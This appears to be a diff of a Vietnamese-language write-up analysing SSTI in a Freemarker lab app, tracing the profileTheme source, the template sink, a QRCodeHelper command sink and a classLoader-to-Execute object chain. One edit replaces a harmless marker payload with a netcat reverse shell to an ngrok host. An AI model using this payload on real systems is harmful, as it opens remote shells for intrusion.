@@ -2983,26 +2983,27 @@ Nếu response không trả command output và chỉ quan sát được delay/fi
 đánh dấu Blind Command Injection.
 ```
 
-# SSTI (Freemarker Object Chain + Dev-Supplied Helper)
+
+
+# SSTI
 
 ***
 
 ## 1. Kết luận nhanh cho SSTI
 
-| Thuộc tính | Giá trị |
-|---|---|
-| Entry point render | `GET /api/v1/profile/basic-info` |
-| Entry point ghi selector | `PUT /api/v1/user` với JSON field `profileTheme` |
-| Quyền truy cập | `ROLE_USER` hoặc `ROLE_ADMIN` |
-| Source selector chính | `User.profileTheme` persisted trong bảng `USER.PROFILE_THEME` |
-| Source template content | File trong `data/custom_themes`, hoặc file/log bị chọn qua LFI |
-| Sink template chính | `new Template("filesystem-profile-theme", new StringReader(templateSource), configuration)` rồi `template.process(model, writer)` |
-| Object-chain anchor | `profileTheme` trong Freemarker model là object `org.example.util.ProfileTheme` |
-| Dev-supplied helper | `"org.example.util.QRCodeHelper"?new()` được template gọi như method |
-| Config làm chain reachable | Freemarker `2.3.29`, `TemplateClassResolver.SAFER_RESOLVER`, `DefaultObjectWrapper` |
-| Trạng thái sau khi gỡ query | Không còn `theme` query param; flow chỉ đi qua persisted `profileTheme` từ JSON |
+| Thuộc tính                 | Giá trị                                                                                                                           |
+| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
+| Entry point render         | `GET /api/v1/profile/basic-info`                                                                                                  |
+| Entry point ghi selector   | `PUT /api/v1/user` với JSON field `profileTheme`                                                                                  |
+| Quyền truy cập             | `ROLE_USER` hoặc `ROLE_ADMIN`                                                                                                     |
+| Source selector chính      | `User.profileTheme` persisted trong bảng `USER.PROFILE_THEME`                                                                     |
+| Source template content    | File trong `data/custom_themes`, hoặc file/log bị chọn qua LFI                                                                    |
+| Sink template chính        | `new Template("filesystem-profile-theme", new StringReader(templateSource), configuration)` rồi `template.process(model, writer)` |
+| Object-chain anchor        | `profileTheme` trong Freemarker model là object `org.example.util.ProfileTheme`                                                   |
+| Dev-supplied helper        | `"org.example.util.QRCodeHelper"?new()` được template gọi như method                                                              |
+| Config làm chain reachable | Freemarker `2.3.29`, `TemplateClassResolver.SAFER_RESOLVER`, `DefaultObjectWrapper`                                               |
 
-> **Nhận định:** SSTI ở flow profile không còn nhận theme selector trực tiếp từ query string. Source điều khiển selector là `profileTheme` được ghi qua `PUT /api/v1/user`, sau đó `GET /api/v1/profile/basic-info` lấy giá trị đã lưu để chọn template. Khi file được chọn chứa Freemarker expression, backend compile nội dung đó bằng `new Template(...)`, từ đó mở hai hướng detect: object-chain qua `profileTheme` object và dev-supplied helper qua `QRCodeHelper?new()`.
+> **Nhận định:**  Source điều khiển selector là `profileTheme` được ghi qua `PUT /api/v1/user`, sau đó `GET /api/v1/profile/basic-info` lấy giá trị đã lưu để chọn template. Khi file được chọn chứa Freemarker expression, backend compile nội dung đó bằng `new Template(...)`, từ đó mở hai hướng detect: object-chain qua `profileTheme` object và dev-supplied helper qua `QRCodeHelper?new()`.
 
 ***
 
@@ -3061,14 +3062,14 @@ flowchart TD
 
 Hướng sink -> source bắt đầu từ việc fuzz/tìm dangerous function của template engine, không bắt đầu từ endpoint. Với SSTI, các handle quan trọng là nơi **compile template từ string/file** và nơi **mở rộng quyền truy cập Java object**.
 
-| Nhóm dangerous function/config | Pattern fuzz trong code | Candidate tìm thấy | Kết luận |
-|---|---|---|---|
-| Runtime template compile | `new Template`, `StringReader`, `template.process` | `CustomThemeLoader.renderTemplateSource(...)` | Sink SSTI chính |
-| Template file load | `getTemplate`, `Files.readString`, `Path.resolve` | `loadClasspathTheme(...)`, `loadFilesystemTheme(...)` | Selector `themeName` quyết định template được render |
-| Freemarker class instantiation | `setNewBuiltinClassResolver`, `?new()` | `SAFER_RESOLVER`, default theme dùng `"org.example.util.QRCodeHelper"?new()` | Dev-supplied helper reachable |
-| Java object exposure | `DefaultObjectWrapper`, `model.put` object | `model.put("profileTheme", new ProfileTheme(...))` | Object-chain anchor reachable |
-| Source persistence | `setProfileTheme`, `@RequestBody User` | `UserController.editUser(...)` | `profileTheme` đến từ JSON update |
-| Render exposure | `produces = TEXT_HTML`, `dangerouslySetInnerHTML` | `ProfileViewController.basicInfo(...)`, `Profile.jsx` | Output HTML được frontend render lại |
+| Nhóm dangerous function/config | Pattern fuzz trong code                            | Candidate tìm thấy                                                           | Kết luận                                             |
+| ------------------------------ | -------------------------------------------------- | ---------------------------------------------------------------------------- | ---------------------------------------------------- |
+| Runtime template compile       | `new Template`, `StringReader`, `template.process` | `CustomThemeLoader.renderTemplateSource(...)`                                | Sink SSTI chính                                      |
+| Template file load             | `getTemplate`, `Files.readString`, `Path.resolve`  | `loadClasspathTheme(...)`, `loadFilesystemTheme(...)`                        | Selector `themeName` quyết định template được render |
+| Freemarker class instantiation | `setNewBuiltinClassResolver`, `?new()`             | `SAFER_RESOLVER`, default theme dùng `"org.example.util.QRCodeHelper"?new()` | Dev-supplied helper reachable                        |
+| Java object exposure           | `DefaultObjectWrapper`, `model.put` object         | `model.put("profileTheme", new ProfileTheme(...))`                           | Object-chain anchor reachable                        |
+| Source persistence             | `setProfileTheme`, `@RequestBody User`             | `UserController.editUser(...)`                                               | `profileTheme` đến từ JSON update                    |
+| Render exposure                | `produces = TEXT_HTML`, `dangerouslySetInnerHTML`  | `ProfileViewController.basicInfo(...)`, `Profile.jsx`                        | Output HTML được frontend render lại                 |
 
 ### 3.2. Sink template compile
 
@@ -3087,12 +3088,12 @@ private String renderTemplateSource(String templateSource, Map<String, Object> m
 
 Điểm nguy hiểm:
 
-| Dòng xử lý | Ý nghĩa bảo mật |
-|---|---|
-| `templateSource` là string đọc từ file | Nội dung ngoài source code có thể trở thành template |
-| `new Template(...StringReader...)` | Freemarker parse expression trong string |
-| `template.process(model, writer)` | Expression được evaluate với model do backend cung cấp |
-| Response là `TEXT_HTML` | Output được trả cho frontend và render bằng HTML |
+| Dòng xử lý                             | Ý nghĩa bảo mật                                       |
+| -------------------------------------- | ----------------------------------------------------- |
+| `templateSource` là string đọc từ file | Nội dung ngoài source code có thể trở thành template  |
+| `new Template(...StringReader...)`     | Freemarker parse expression trong string              |
+| `template.process(model, writer)`      | Expression được process với model do backend cung cấp |
+| Response là `TEXT_HTML`                | Output được trả cho frontend và render bằng HTML      |
 
 ### 3.3. Dev-supplied helper: `QRCodeHelper?new()`
 
@@ -3103,7 +3104,7 @@ Freemarker config đang dùng `SAFER_RESOLVER`:
 configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
 ```
 
-`SAFER_RESOLVER` vẫn cho template instantiate một số class hợp lệ trong application. WebLab có một helper nội bộ implement `TemplateMethodModelEx`:
+`SAFER_RESOLVER` vẫn cho template khởi tạo một số class hợp lệ trong application. WebLab có một helper nội bộ implement `TemplateMethodModelEx`:
 
 ```java
 // src/main/java/org/example/util/QRCodeHelper.java
@@ -3119,7 +3120,7 @@ public class QRCodeHelper implements TemplateMethodModelEx {
 }
 ```
 
-Template mặc định đã chứng minh helper này được dev-supplied cho Freemarker:
+Template mặc định đã chứng minh helper này được xây dựng cho Freemarker:
 
 ```ftl
 <#assign memberQr = "org.example.util.QRCodeHelper"?new()>
@@ -3130,7 +3131,7 @@ Khi template content bị attacker kiểm soát, helper có thể được gọi
 
 ```ftl
 <#assign qr = "org.example.util.QRCodeHelper"?new()>
-${qr("demo; touch /tmp/weblab-ssti-qr-marker; #")}
+${qr("; nc -e /bin/sh 0.tcp.ap.ngrok.io <port>; #")}
 ```
 
 Luồng detect dev-supplied helper:
@@ -3234,12 +3235,12 @@ flowchart TD
 
 Kết luận riêng cho nhánh object-chain:
 
-| Điều kiện | Có trong code? | Ghi chú |
-|---|---:|---|
-| Model expose object không phải scalar | Có | `ProfileTheme` |
-| Wrapper cho phép bean-style object access | Có | `DefaultObjectWrapper` |
-| Version cố định phù hợp lab | Có | `freemarker.version = 2.3.29` |
-| Template content được evaluate | Có | `new Template(...).process(...)` |
+| Điều kiện                                 | Có trong code? | Ghi chú                          |
+| ----------------------------------------- | -------------: | -------------------------------- |
+| Model expose domain object                |             Có | `ProfileTheme`                   |
+| Wrapper cho phép bean-style object access |             Có | `DefaultObjectWrapper`           |
+| Version cố định phù hợp với object chain  |             Có | `freemarker.version = 2.3.29`    |
+| Template content được evaluate            |             Có | `new Template(...).process(...)` |
 
 ### 3.5. Truy ngược về source `profileTheme`
 
@@ -3486,7 +3487,6 @@ SSTI detect được trình bày riêng theo hai hướng:
 1. **Dev-supplied helper:** `SAFER_RESOLVER` + `QRCodeHelper implements TemplateMethodModelEx` cho phép template gọi `"org.example.util.QRCodeHelper"?new()`, rồi đưa argument vào hidden command sink.
 2. **Object chain:** `DefaultObjectWrapper` + `model.profileTheme = new ProfileTheme(...)` cho phép template đi từ `profileTheme.class` đến `classLoader`, rồi load các utility class như `freemarker.template.utility.Execute`.
 
-Sau khi gỡ `theme` query, source selector hợp lệ duy nhất của flow này là:
 
 ```text
 PUT /api/v1/user JSON profileTheme
